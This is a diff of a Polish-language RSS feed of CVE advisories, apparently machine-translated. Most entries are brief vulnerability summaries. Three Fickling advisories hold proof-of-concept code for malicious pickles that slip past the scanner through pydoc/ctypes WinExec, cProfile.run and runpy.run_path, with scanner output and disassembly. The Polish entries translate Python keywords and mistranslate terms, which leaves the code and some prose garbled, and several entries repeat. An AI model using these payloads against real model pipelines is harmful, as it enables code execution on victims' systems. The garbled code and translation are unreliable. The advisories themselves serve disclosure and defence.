@@ -1,5 +1,402 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2025-15496</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15496</link><pubDate>Fri, 09 Jan 2026 17:02:12 +0000</pubDate><description>W guchengwuyue yshopmall do wersji 1.9.1 została stwierdzona podatność.Dotknięta jest funkcja getPage w pliku /api/jobs.Ta manipulacja sortowaniem argumentów powoduje wstrzyknięcie sql.Atak może zostać zainicjowany zdalnie.Exploit został publicznie ujawniony i może zostać wykorzystany.Projekt został wcześnie poinformowany o problemie poprzez raport o problemie, ale jeszcze nie udzielił odpowiedzi.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2025-46297</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-46297</link><pubDate>Fri, 09 Jan 2026 21:18:39 +0000</pubDate><description>Naprawiono problem z uprawnieniami, wprowadzając dodatkowe ograniczenia.Ten problem został rozwiązany w systemie macOS Tahoe 26.2.Aplikacja może mieć dostęp do chronionych plików w kontenerze piaskownicy aplikacji.</description></item><item><title>CVE-2025-62487</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-62487</link><pubDate>Fri, 09 Jan 2026 21:17:37 +0000</pubDate><description>### Szczegóły
+1 października 2025 r. firma Palantir odkryła, że obrazy przesłane za pośrednictwem aplikacji front-end Dossier nie były poprawnie oznaczane i nie zapewniały odpowiednich poziomów bezpieczeństwa.Regresję powiązano ze zmianą w maju 2025 r., która miała umożliwić przesyłanie plików między różnymi artefaktami (np. innymi dokumentacjami i prezentacjami).
+
+W przypadku wdrożeń skonfigurowanych za pomocą CBAC interfejs wyświetla okno dialogowe wyboru zabezpieczeń, w którym można ustawić poziom zabezpieczeń przesyłanych plików, łagodząc w ten sposób problem.
+
+W przypadku wdrożeń bez konfiguracji CBAC nie pojawia się okno dialogowe wyboru zabezpieczeń, co prowadzi do poziomu bezpieczeństwa NIESTANDARDOWEGO bez wybranych oznaczeń ani zestawów danych.Wynikowe oznaczenia i grupy dla przesyłanych plików będą zatem tylko tymi dodanymi przez „Domyślne reguły autoryzacji” zdefiniowane w konfiguracji Wybór uwierzytelniania.W większości środowisk oczekuje się, że „Domyślne reguły autoryzacji” dodadzą tylko grupę Wszyscy.
+
+CVSS Score: 3.5 (low)</description></item><item><title>CVE-2025-46298</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-46298</link><pubDate>Fri, 09 Jan 2026 21:16:30 +0000</pubDate><description>Ten problem rozwiązano przez poprawienie obsługi pamięci.Ten problem został rozwiązany w systemach tvOS 26.2, Safari 26.2, watchOS 26.2, VisionOS 26.2, iOS 26.2 i iPadOS 26.2, macOS Tahoe 26.2.Przetwarzanie złośliwie spreparowanej zawartości internetowej może spowodować nieoczekiwaną awarię procesu.</description></item><item><title>CVE-2025-46299</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-46299</link><pubDate>Fri, 09 Jan 2026 21:15:50 +0000</pubDate><description>Rozwiązano problem z inicjowaniem pamięci i poprawiono obsługę pamięci.Ten problem został rozwiązany w systemach tvOS 26.2, Safari 26.2, watchOS 26.2, VisionOS 26.2, iOS 26.2 i iPadOS 26.2, macOS Tahoe 26.2.Przetwarzanie złośliwie spreparowanej zawartości internetowej może ujawnić wewnętrzne stany aplikacji.</description></item><item><title>CVE-2025-46286</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-46286</link><pubDate>Fri, 09 Jan 2026 21:14:39 +0000</pubDate><description>Naprawiono problem logiczny przez ulepszenie sprawdzania poprawności.Ten problem został rozwiązany w iOS 26.2 i iPadOS 26.2.Przywrócenie z kopii zapasowej może uniemożliwić wymaganie hasła natychmiast po rejestracji Face ID.</description></item><item><title>CVE-2026-0830</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0830</link><pubDate>Fri, 09 Jan 2026 21:10:09 +0000</pubDate><description>Przetwarzanie specjalnie spreparowanych nazw folderów obszarów roboczych może pozwolić na wprowadzenie dowolnego polecenia do pomocnika Kiro GitLab Merge-Request w Kiro IDE przed wersją 0.6.18 podczas otwierania złośliwie spreparowanych obszarów roboczych.
+
+Aby temu zaradzić, użytkownicy powinni zaktualizować do najnowszej wersji.
+
+CVSS Score: 7.8 (high)</description></item><item><title>CVE-2026-22608</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22608</link><pubDate>Fri, 09 Jan 2026 21:05:13 +0000</pubDate><description># Ocena Ficklinga
+
+Do listy niebezpiecznych importów dodano `pydoc` i `ctypes` (https://github.com/trailofbits/fickling/commit/b793563e60a5e039c5837b09d7f4f6b92e6040d1).
+
+# Oryginalny raport
+
+### Podsumowanie
+Zarówno moduły ctypes, jak i pydoc nie są wyraźnie blokowane.Nawet inne istniejące narzędzia do skanowania pickles (takie jak picklescan) nie blokują pydoc.locate.Łącząc te dwa elementy, można uzyskać RCE, podczas gdy skaner nadal zgłasza plik jako LIKELY_SAFE
+
+### Szczegóły
+Import: GLOBALNA lokalizacja pydoc (dozwolona).
+Rozwiązanie: wywołaj funkcję zlokalizowania('ctypes.windll.kernel32.WinExec').
+Wykonanie: Wywołaj wynik za pomocą (b'calc.exe', 1).
+
+Aby ominąć sprawdzanie nieużywanej zmiennej, używany jest obiekt wyjątku, przy założeniu, że wyjątek nie zostanie zablokowany w przyszłości, ponieważ jest to łagodna wbudowa
+
+### PoC
+```pyton
+importuj os
+
+GLOBALNY = b'c'
+ŁAŃCUCH = b'S'
+BININT = b'K'
+KRÓTKA1 = b'\x85'
+KRÓTKA2 = b'\x86'
+EMPTY_TUPLE = b')'
+REDUKCJA = b'R'
+PUT = b'p'
+POBIERZ = b'g'
+POP = b'0'
+EMPTY_DICT = b'}'
+SETITEM = b'
+BUDOWAĆ = b'b'
+STOP = b'.'
+
+def generuj_stealth_payload():
+ładunek = b""
+
+ładunek += GLOBALNY + b"pydoc\nlocate\n"
+ładunek += STRING + b"'ctypes.windll.kernel32.WinExec'\n"
+ładunek += TUPLE1 + REDUCE
+ładunek += PUT + b"0\n" # Var 0 = &lt;_FuncPtr WinExec&gt;
+ładunek += POP
+
+ładunek += GET + b"0\n"
+ładunek += b"C" + b"\x08" + b"calc.exe"
+ładunek += BININT + b"\x01"
+ładunek += TUPLE2 + REDUCE
+ładunek += PUT + b"1\n" # Var 1 = Wynik wykonania
+ładunek += POP
+
+ładunek += GLOBALNY + b"wbudowane\nWyjątek\n"
+ładunek += EMPTY_TUPLE + REDUCE
+ładunek += PUT + b"2\n" # Var 2 = Instancja wyjątku
+
+ładunek += EMPTY_DICT
+ładunek += STRING + b"''ce_status'\n"
+ładunek += GET + b"1\n"
+ładunek += SETITEM # { 'ce_status': wynik }
+
+ładunek += BUDOWA
+
+ładunek += STOP
+ładunek zwrotny
+
+dane = generuj_stealth_payload()
+z open("stealth_ctypes.pkl", "wb") jako f:
+f.zapisz(dane)
+
+print("Wygenerowano 'stealth_ctypes.pkl'")
+````
+
+Co widzi fikuś
+```pyton
+z lokalizacji importu pydoc
+_var0 = zlokalizować('ctypes.windll.kernel32.WinExec')
+_var1 = _var0(b'calc.exe', 1)
+_var2 = wyjątek()
+_var3 = _var2
+_var3.__setstate__({'rce_status': _var1})
+wynik0 = _zmienna3
+```
+&lt;img szerokość="915" wysokość="197" alt="image" src="https://github.com/user-attachments/assets/b5d81e0d-4946-4768-a704-618a4554ae7a" /&gt;</description></item><item><title>CVE-2026-22607</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22607</link><pubDate>Fri, 09 Jan 2026 21:04:22 +0000</pubDate><description># Fickling's assessment
+
+`cProfile` was added to the list of unsafe imports (https://github.com/trailofbits/fickling/commit/dc8ae12966edee27a78fe05c5745171a2b138d43).
+
+# Original report
+
+## Description
+
+### Summary
+
+Fickling versions up to and including 0.1.6 do not treat Python's `cProfile` module as unsafe. Because of this, a malicious pickle that uses `cProfile.run()` is classified as SUSPICIOUS instead of OVERTLY_MALICIOUS.
+
+If a user relies on Fickling's output to decide whether a pickle is safe to deserialize, this misclassification can lead them to execute attacker-controlled code on their system.
+
+This affects any workflow or product that uses Fickling as a security gate for pickle deserialization.
+
+### Details
+
+The `cProfile` module is missing from fickling's block list of unsafe module imports in `fickling/analysis.py`. This is the same root cause as CVE-2025-67748 (pty) and CVE-2025-67747 (marshal/types).
+
+Incriminated source code:
+
+- File: `fickling/analysis.py`
+- Class: `UnsafeImports`
+- Issue: The blocklist does not include `cProfile`, `cProfile.run`, or `cProfile.runctx`
+
+Reference to similar fix:
+
+- PR #187 added `pty` to the blocklist to fix CVE-2025-67748
+- PR #108 documented the blocklist approach
+- The same fix pattern should be applied for `cProfile`
+
+How the bypass works:
+
+1. Attacker creates a pickle using `cProfile.run()` in `__reduce__`
+2. `cProfile.run()` accepts a Python code string and executes it directly (C-accelerated version of profile.run)
+3. Fickling's `UnsafeImports` analysis does not flag `cProfile` as dangerous
+4. Only the `UnusedVariables` heuristic triggers, resulting in SUSPICIOUS severity
+5. The pickle should be rated OVERTLY_MALICIOUS like `os.system`, `eval`, and `exec`
+
+Tested behavior (fickling 0.1.6):
+
+| Function | Fickling Severity | RCE Capable |
+|----------|-------------------|-------------|
+| os.system | LIKELY_OVERTLY_MALICIOUS | Yes |
+| eval | OVERTLY_MALICIOUS | Yes |
+| exec | OVERTLY_MALICIOUS | Yes |
+| cProfile.run | SUSPICIOUS | Yes ← BYPASS |
+| cProfile.runctx | SUSPICIOUS | Yes ← BYPASS |
+
+Suggested fix:
+
+Add to the unsafe imports blocklist in `fickling/analysis.py`:
+- `cProfile`
+- `cProfile.run`
+- `cProfile.runctx`
+- `_lsprof` (underlying C module)
+
+## PoC
+
+Complete instructions, including specific configuration details, to reproduce the vulnerability.
+
+Environment:
+- Python 3.13.2
+- fickling 0.1.6 (latest version, installed via pip)
+
+### Step 1: Create malicious pickle
+
+```python
+import pickle
+import cProfile
+
+class MaliciousPayload:
+    def __reduce__(self):
+        return (cProfile.run, ("print('CPROFILE_RCE_CONFIRMED')",))
+
+with open("malicious.pkl", "wb") as f:
+    pickle.dump(MaliciousPayload(), f)
+```
+
+### Step 2: Analyze with fickling
+
+```python
+from fickling.fickle import Pickled
+from fickling.analysis import check_safety
+
+with open('malicious.pkl', 'rb') as f:
+    data = f.read()
+
+pickled = Pickled.load(data)
+result = check_safety(pickled)
+print(f"Severity: {result.severity}")
+print(f"Analysis: {result}")
+```
+
+Expected output (if properly detected):
+```
+Severity: Severity.OVERTLY_MALICIOUS
+```
+
+Actual output (bypass confirmed):
+```
+Severity: Severity.SUSPICIOUS
+Analysis: Variable `_var0` is assigned value `run(...)` but unused afterward; this is suspicious and indicative of a malicious pickle file
+```
+
+### Step 3: Prove RCE by loading the pickle
+
+```bash
+python -c "import pickle; pickle.load(open('malicious.pkl', 'rb'))"
+```
+
+Output
+```
+CPROFILE_RCE_CONFIRMED
+         4 function calls in 0.000 seconds
+
+   Ordered by: standard name
+
+   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
+        1    0.000    0.000    0.000    0.000 &lt;string&gt;:1(&lt;module&gt;)
+        1    0.000    0.000    0.000    0.000 {built-in method builtins.exec}
+        1    0.000    0.000    0.000    0.000 {built-in method builtins.print}
+        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}
+```
+
+Check: The code executes, proving RCE.
+
+### Pickle disassembly (evidence):
+
+```
+    0: \x80 PROTO      5
+    2: \x95 FRAME      58
+   11: \x8c SHORT_BINUNICODE 'cProfile'
+   21: \x94 MEMOIZE    (as 0)
+   22: \x8c SHORT_BINUNICODE 'run'
+   27: \x94 MEMOIZE    (as 1)
+   28: \x93 STACK_GLOBAL
+   29: \x94 MEMOIZE    (as 2)
+   30: \x8c SHORT_BINUNICODE "print('CPROFILE_RCE_CONFIRMED')"
+   63: \x94 MEMOIZE    (as 3)
+   64: \x85 TUPLE1
+   65: \x94 MEMOIZE    (as 4)
+   66: R    REDUCE
+   67: \x94 MEMOIZE    (as 5)
+   68: .    STOP
+highest protocol among opcodes = 4
+```
+
+## Impact
+
+Vulnerability Type:
+
+Incomplete blocklist leading to safety check bypass (CWE-184) and arbitrary code execution via insecure deserialization (CWE-502).
+
+Who is impacted:
+
+Any user or system that relies on fickling to vet pickle files for security issues before loading them. This includes:
+- ML model validation pipelines
+- Model hosting platforms (Hugging Face, MLflow, etc.)
+- Security scanning tools that use fickling
+- CI/CD pipelines that validate pickle artifacts
+
+Attack scenario:
+
+An attacker uploads a malicious ML model or pickle file to a model repository. The victim's pipeline uses fickling to scan uploads. Fickling rates the file as "SUSPICIOUS" (not "OVERTLY_MALICIOUS"), so the file is not rejected. When the victim loads the model, arbitrary code executes on their system.
+
+Why cProfile.run() is dangerous:
+
+Unlike `runpy.run_path()` which requires a file on disk, `cProfile.run()` takes a code string directly. This means the entire attack is self-contained in the pickle - no external files needed. Python docs explicitly state that `cProfile.run()` takes "a single argument that can be passed to the exec() function".
+
+`cProfile` is the C-accelerated version and is more commonly available than `profile`. It's also the recommended profiler per Python docs ("cProfile is recommended for most users"), so it's present in virtually all Python installations.
+
+Severity: HIGH
+
+- The attacker achieves arbitrary code execution
+- The security control (fickling) is specifically designed to prevent this
+- The bypass requires no special conditions beyond crafting the pickle with cProfile
+- Attack is fully self-contained (no external files needed)
+- cProfile is more commonly used than profile, increasing attack surface</description></item><item><title>CVE-2026-22606</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22606</link><pubDate>Fri, 09 Jan 2026 20:52:40 +0000</pubDate><description># Ocena Ficklinga
+
+`runpy` został dodany do listy niebezpiecznych importów (https://github.com/trailofbits/fickling/commit/9a2b3f89bd0598b528d62c10a64c1986fcb09f66).
+
+# Oryginalny raport
+
+### Podsumowanie
+Wersje Ficklinga do 0.1.6 włącznie nie traktują modułu Runpy Pythona jako niebezpiecznego.Z tego powodu złośliwa marynata korzystająca z funkcji runpy.run_path() lub runpy.run_module() jest klasyfikowana jako PODEJRZANA, a nie OVERTLY_MALICIOUS.
+
+Jeśli użytkownik opiera się na wynikach Ficklinga, aby zdecydować, czy marynatę można bezpiecznie deserializować, ta błędna klasyfikacja może doprowadzić go do wykonania w systemie kodu kontrolowanego przez osobę atakującą.
+
+Ma to wpływ na każdy przepływ pracy lub produkt, który wykorzystuje Fickling jako bramę bezpieczeństwa do deserializacji marynat.
+
+### Szczegóły
+Brakuje modułu `runpy` na liście bloków ficklinga zawierającej niebezpieczne importy modułów w `fickling/analytics.py`.Jest to ta sama główna przyczyna, co CVE-2025-67748 (pty) i CVE-2025-67747 (marshal/types).
+
+Oskarżony kod źródłowy:
+- Plik: `fickling/analytics.py`
+- Klasa: `UnsafeImports`
+- Problem: lista zablokowanych nie zawiera `runpy`, `runpy.run_path`, `runpy.run_module` ani `runpy._run_code`
+
+Odniesienie do podobnej poprawki:
+— PR #187 dodał `pty` do listy zablokowanych, aby naprawić CVE-2025-67748
+- PR nr 108 dokumentuje podejście oparte na liście zablokowanych
+- Ten sam wzorzec poprawek powinien zostać zastosowany dla `runpy`
+
+Jak działa obejście:
+1. Atakujący tworzy pikle za pomocą `runpy.run_path()` w `__reduce__`
+2. Analiza Ficklinga „UnsafeImports” nie oznacza, że „runpy” jest niebezpieczny
+3. Wyzwala tylko heurystyka „UnusedVariables”, co skutkuje „POJAZDĄ” ważnością
+4. Marynata powinna mieć ocenę „OVERTLY_MALICIOUS”, np. „os.system”, „eval” i „exec”
+
+Testowane zachowanie (migotanie 0.1.6):
+
+|Funkcja |Niestabilna dotkliwość |Możliwość RCE |
+|--------------------------------|----------------------------|------------|
+|system operacyjny |LIKELY_OVERTLY_MALICIOUS |Tak |
+|ewaluacja |OVERTLY_MALICIOUS |Tak |
+|wykonawczy |OVERTLY_MALICIOUS |Tak |
+|runpy.run_path |PODEJRZANE |Tak ← OBEJŚCIE |
+|runpy.run_module |PODEJRZANE |Tak ← OBEJŚCIE |
+
+Sugerowana poprawka:
+Dodaj do listy blokowanych niebezpiecznych importów w `fickling/analytics.py`:
+- runiczny
+- runpy.run_path
+- runpy.run_module
+- runpy._run_code
+- runpy._run_module_code
+
+### PoC
+_Kompletne instrukcje, w tym szczegółowe szczegóły konfiguracji, umożliwiające odtworzenie luki._**Środowisko:**
+- Python 3.13.2
+- fickling 0.1.6 (najnowsza wersja, instalowana przez pip)
+
+Krok 1: Utwórz złośliwą marynatę
+
+importuj marynatę
+importuj runpy
+
+klasa MaliciousPayload:
+def __redukcja__(samodzielnie):
+return (runpy.run_path, („/tmp/malicious_script.py”,))
+
+z open("malicious.pkl", "wb") jako f:
+pickle.dump(MaliciousPayload(), f)
+
+Krok 2: Utwórz złośliwy skrypt, który zostanie wykonany
+
+echo 'print("RCE OSIĄGNIĘTE");open("/tmp/pwned","w").write("naruszony")' &gt; /tmp/malicious_script.py
+
+Krok 3: Analiza za pomocą fickingu
+
+zmienny --check-safety malware.pkl
+
+Oczekiwany wynik (jeśli zostanie prawidłowo wykryty):
+Ważność: OVERTLY_MALICIOUS
+
+Rzeczywista moc wyjściowa (potwierdzone obejście):
+{
+"ważność": "POJAZDNE",
+"analytics": "Zmienna `_var0` ma przypisaną wartość `run_path(...)`, ale później nie jest używana; jest to podejrzane i wskazuje na złośliwy plik pickle",
+„szczegółowe_wyniki”: {
+„Wynik analizy”: {
+„Nieużywane zmienne”: [„_var0”, „run_path(...)”]
+}
+}
+}
+
+Krok 4: Udowodnij RCE, ładując marynatę
+
+importuj marynatę
+pickle.load(open("złośliwy.pkl", "rb"))
+# Sprawdź: ls /tmp/pwned &lt;-- istnieje plik potwierdzający wykonanie kodu
+
+Demontaż marynaty (dowód):
+
+0: \x80 PROTO 4
+2: \x95 RAMKA 92
+11: \x8c SHORT_BINUNICODE „runpy”
+18: \x94 ZApamiętaj (jako 0)
+19: \x8c SHORT_BINUNICODE „ścieżka_uruchamiania”
+29: \x94 ZApamiętaj (jako 1)
+30: \x93 STACK_GLOBALNY
+31: \x94 ZApamiętaj (jako 2)
+32: \x8c SHORT_BINUNICODE '/tmp/malicious_script.py'
+...
+100: R ZMNIEJSZ
+101: \x94 ZApamiętaj (jako 5)
+102: .ZATRZYMAJ się
+
+### Wpływ
+
+Typ luki:
+Niekompletna lista bloków prowadząca do obejścia kontroli bezpieczeństwa (CWE-184) i wykonania dowolnego kodu poprzez niebezpieczną deserializację (CWE-502).
+
+Na kogo wpływa:
+Każdy użytkownik lub system, który polega na sprawdzaniu plików pod kątem bezpieczeństwa przed ich załadowaniem.Obejmuje to:
+
+Scenariusz ataku:
+Osoba atakująca przesyła złośliwy model ML lub plik pickle do repozytorium modeli.Potok ofiary wykorzystuje zmienne skanowanie do skanowania przesyłanych plików.Fickling ocenia plik jako „podejrzany” (a nie „OVERTLY_MALICIOUS”), więc plik nie zostaje odrzucony.Kiedy ofiara ładuje model, w jej systemie wykonywany jest dowolny kod.
+
+Dotkliwość: WYSOKA
+- Atakujący wykonuje dowolny kod
+- Kontrola bezpieczeństwa (migotanie) została specjalnie zaprojektowana, aby temu zapobiec
+- Obejście nie wymaga żadnych specjalnych warunków poza przygotowaniem marynaty z „runpy”.</description></item><item><title>CVE-2025-15496</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15496</link><pubDate>Fri, 09 Jan 2026 17:02:12 +0000</pubDate><description>W guchengwuyue yshopmall do wersji 1.9.1 została stwierdzona podatność.Dotknięta jest funkcja getPage w pliku /api/jobs.Ta manipulacja sortowaniem argumentów powoduje wstrzyknięcie sql.Atak może zostać zainicjowany zdalnie.Exploit został publicznie ujawniony i może zostać wykorzystany.Projekt został wcześnie poinformowany o problemie poprzez raport o problemie, ale jeszcze nie udzielił odpowiedzi.
 
 CVSS Score: 6.3 (medium)</description></item><item><title>CVE-2025-15495</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15495</link><pubDate>Fri, 09 Jan 2026 17:02:09 +0000</pubDate><description>W BiggiDroid Simple PHP CMS 1.0 została odkryta podatność.Ma to wpływ na nieznaną funkcję pliku /admin/editsite.php.Manipulowanie obrazem argumentu powoduje nieograniczone przesyłanie.Atak może zostać przeprowadzony zdalnie.Exploit został upubliczniony i może zostać wykorzystany.Skontaktowano się ze sprzedawcą w sprawie tego ujawnienia wcześniej, ale nie udzielił on żadnej odpowiedzi.
 
@@ -138,7 +535,7 @@ CVSS Score: 4.3 (medium)</description></item><item><title>CVE-2025-14886</title>
 
 CVSS Score: 5.3 (medium)</description></item><item><title>CVE-2025-66315</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66315</link><pubDate>Fri, 09 Jan 2026 02:24:58 +0000</pubDate><description>W serwerze wersji produktów ZTE MF258K Pro występuje luka w konfiguracji.Z powodu nieprawidłowych ustawień uprawnień do katalogu osoba atakująca może wykonać uprawnienia do zapisu w określonym katalogu.
 
-CVSS Score: 4.3 (medium)</description></item><item><title>CVE-2026-22710</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22710</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - rozszerzenie Wikibase umożliwia obsługę skryptów krzyżowych (XSS). Ten problem dotyczy Mediawiki - rozszerzenie Wikibase: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22712</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22712</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Niewłaściwe kodowanie lub ucieczka danych wyjściowych z powodu zamiany magicznych słów w luce ParserAfterTidy w Wikimedia Foundation Mediawiki - rozszerzenie ApprovedRevs umożliwia manipulację danymi wejściowymi. Ten problem dotyczy rozszerzenia Mediawiki - ApprovedRevs: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22714</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22714</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - Monaco Skin umożliwia Cross-Site Scripting (XSS). Ten problem dotyczy Mediawiki - Monaco Skin: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22713</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22713</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w rozszerzeniu Wikimedia Foundation Mediawiki - GrowthExperiments umożliwia obsługę skryptów Cross-Site Scripting (XSS). Ten problem dotyczy rozszerzenia Mediawiki - GrowthExperiments: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2025-67282</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67282</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach związanych z obejściem autoryzacji, które umożliwiają użytkownikowi o niskich uprawnieniach pobieranie skrótów haseł innego użytkownika, uzyskiwanie dostępu do elementów roboczych innego użytkownika, modyfikowanie ograniczonej zawartości w przepływach pracy, modyfikowanie logo aplikacji i manipulowanie profilem innego użytkownika.</description></item><item><title>CVE-2025-67281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67281</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach polegających na wstrzykiwaniu kodu SQL, które umożliwiają użytkownikowi o niskich uprawnieniach i uprawnieniach administratora dostęp do bazy danych i jej zawartości.</description></item><item><title>CVE-2025-67280</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67280</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach związanych z wstrzykiwaniem języka Hibernate Query Language, które umożliwiają użytkownikowi o niskim poziomie uprawnień wyodrębnianie haseł innych użytkowników i uzyskiwanie dostępu do wrażliwych danych innego użytkownika.</description></item><item><title>CVE-2025-67279</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67279</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Problem w TIM Solution GmbH TIM BPM Suite i TIM FLOW przed wersją 9.1.2 umożliwia zdalnemu atakującemu eskalację uprawnień za pośrednictwem aplikacji przechowującej skróty haseł w formacie MD5</description></item><item><title>CVE-2025-67278</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67278</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Problem w TIM Solution GmbH TIM BPM Suite i TIM FLOW przed wersją 9.1.2 umożliwia zdalnemu atakującemu eskalację uprawnień za pomocą spreparowanego żądania HTTP</description></item><item><title>CVE-2025-67004</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67004</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach CouchCMS 2.4 umożliwiająca ujawnienie informacji umożliwia administratorowi odczytywanie dowolnych plików poprzez przechodzenie po katalogach.Może ujawnić kod źródłowy lub inne poufne informacje, jeśli zostanie odpowiednio uzbrojony.</description></item><item><title>CVE-2025-70161</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-70161</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>EDIMAX BR-6208AC V2_1.02 jest podatny na wstrzykiwanie poleceń.Dzieje się tak, ponieważ pole pppUserName jest bezpośrednio przekazywane do polecenia powłoki za pośrednictwem funkcji system() bez odpowiedniego oczyszczenia.Osoba atakująca może to wykorzystać, wprowadzając złośliwe polecenia do pola pppUserName, umożliwiając wykonanie dowolnego kodu.</description></item><item><title>CVE-2025-69542</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69542</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W usłudze demona DHCP D-Link DIR895LA1 v102b07 wykryto lukę w zabezpieczeniach związaną z wstrzykiwaniem poleceń.Luka występuje w logice przetwarzania odnowienia dzierżawy, w której parametr nazwy hosta DHCP jest bezpośrednio łączony z poleceniem systemowym bez odpowiedniego oczyszczenia.Gdy klient DHCP odnawia istniejącą dzierżawę przy użyciu złośliwej nazwy hosta, dowolne polecenia mogą być wykonywane z uprawnieniami roota.</description></item><item><title>CVE-2025-67133</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67133</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Błąd w Hero Motocorp Vida V1 Pro 2.0.7 umożliwia lokalnemu atakującemu spowodowanie odmowy usługi za pośrednictwem komponentu BLE</description></item><item><title>CVE-2025-66744</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66744</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W Yonyou YonBIP v3 i wcześniejszych interfejs LoginWithV8 w systemie obsługi aplikacji danych szeregowych jest podatny na przemierzanie ścieżek, umożliwiając nieautoryzowany dostęp do wrażliwych informacji w systemie</description></item><item><title>CVE-2025-66715</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66715</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach Axtion ODISSAAS ODIS v1.8.4 umożliwiająca przejęcie biblioteki DLL umożliwia atakującym wykonanie dowolnego kodu za pośrednictwem spreparowanego pliku DLL.</description></item><item><title>CVE-2026-22714</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22714</link><pubDate>Thu, 08 Jan 2026 23:56:07 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - Monaco Skin umożliwia Cross-Site Scripting (XSS). Ten problem dotyczy Mediawiki - Monaco Skin: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-0733</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0733</link><pubDate>Thu, 08 Jan 2026 23:32:13 +0000</pubDate><description>W systemie rejestracji kursów online PHPGurukul do wersji 3.1 została stwierdzona luka.Ma to wpływ na nieznaną funkcję pliku /onlinecourse/admin/manage-students.php.Ta manipulacja argumentem cid powoduje wstrzyknięcie sql.Istnieje możliwość zdalnego zainicjowania ataku.Exploit został publicznie ujawniony i może zostać wykorzystany.
